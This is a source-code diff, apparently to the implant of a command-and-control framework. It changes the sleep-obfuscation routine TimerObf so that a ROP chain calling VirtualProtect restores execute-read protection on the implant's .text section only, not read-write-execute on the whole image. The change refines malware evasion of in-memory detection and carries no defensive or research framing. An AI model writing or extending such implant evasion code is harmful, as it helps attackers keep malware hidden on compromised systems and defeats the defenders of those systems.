@@ -67,7 +67,6 @@ VOID FoliageObf(
     DWORD               dwProtect   = PAGE_EXECUTE_READWRITE;
     SIZE_T              TmpValue    = 0;
 
-
     ImageBase = Instance.Session.ModuleBase;
     ImageSize = Instance.Session.ModuleSize;
 
@@ -385,6 +384,25 @@ BOOL TimerObf(
     NTSTATUS NtStatus  = STATUS_SUCCESS;
     DWORD    Inc       = 0;
 
+    LPVOID              ImageBase   = NULL;
+    SIZE_T              ImageSize   = 0;
+    LPVOID              TxtBase     = NULL;
+    SIZE_T              TxtSize     = 0;
+    DWORD               dwProtect   = PAGE_EXECUTE_READWRITE;
+
+    ImageBase = Instance.Session.ModuleBase;
+    ImageSize = Instance.Session.ModuleSize;
+
+    // Check if .text section is defined
+    if (Instance.Session.TxtBase != 0 && Instance.Session.TxtSize != 0) {
+        TxtBase = Instance.Session.TxtBase;
+        TxtSize = Instance.Session.TxtSize;
+        dwProtect  = PAGE_EXECUTE_READ;
+    } else {
+        TxtBase = Instance.Session.ModuleBase;
+        TxtSize = Instance.Session.ModuleSize;
+    }
+
     /* create a random key */
     for ( BYTE i = 0; i < 16; i++ ) {
         Buf[ i ] = RandomNumber32( );
@@ -539,9 +557,9 @@ BOOL TimerObf(
 
                     /* Protect */
                     Rop[ Inc ].Rip = U_PTR( Instance.Win32.VirtualProtect );
-                    Rop[ Inc ].Rcx = U_PTR( ImgBase );
-                    Rop[ Inc ].Rdx = U_PTR( ImgSize );
-                    Rop[ Inc ].R8  = U_PTR( PAGE_EXECUTE_READWRITE );
+                    Rop[ Inc ].Rcx = U_PTR( TxtBase );
+                    Rop[ Inc ].Rdx = U_PTR( TxtSize );
+                    Rop[ Inc ].R8  = U_PTR( dwProtect );
                     Rop[ Inc ].R9  = U_PTR( &Value );
                     Inc++;
 
